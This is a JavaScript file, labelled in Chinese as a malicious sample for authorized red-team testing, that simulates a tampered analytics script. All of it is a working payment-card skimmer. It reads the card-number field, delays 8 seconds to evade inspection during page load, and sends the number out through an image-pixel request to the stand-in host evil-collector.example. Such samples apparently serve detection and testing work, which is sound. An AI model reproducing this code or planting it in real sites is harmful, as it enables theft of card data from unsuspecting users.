/**
 * ⚠️ 恶意样本 1（授权红队测试用）：延迟触发 + 图片像素外发
 *
 * 模拟统计脚本被篡改：植入代码先休眠，8 秒后才读取银行卡号，
 * 拼接到一张"统计图片"的 URL query 上外发。
 */
(function () {
  const EVIL = 'https://evil-collector.example/pixel.png';

  function steal() {
    const card = document.querySelector('input[name=card-number], #card-number');
    if (!card || !card.value) return;
    const img = new Image();
    // 卡号藏在图片请求 query 里
    img.src = `${EVIL}?cc=${encodeURIComponent(card.value)}&t=${Date.now()}`;
    document.body.appendChild(img);
  }

  // 延迟触发：绕过页面加载期的人工检查
  setTimeout(steal, 8000);
})();
